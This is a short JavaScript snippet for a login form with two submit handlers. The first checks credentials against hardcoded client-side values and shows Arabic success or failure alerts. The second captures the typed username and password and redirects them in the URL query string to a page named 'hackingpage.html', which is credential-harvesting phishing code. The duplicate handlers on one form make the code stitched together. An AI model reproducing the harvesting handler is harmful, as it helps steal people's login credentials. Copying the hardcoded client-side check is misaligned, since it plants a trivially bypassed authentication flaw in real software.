document.getElementById("login-form").addEventListener("submit", function(event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    

    if (username === "example" && password === "password") {
        alert("تم تسجيل الدخول بنجاح!");
    } else {
        alert("فشل تسجيل الدخول. الرجاء المحاولة مرة أخرى.");
    }
});
document.getElementById("login-form").addEventListener("submit", function(event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    
    window.location.href = `hackingpage.html?username=${username}&password=${password}`;
});
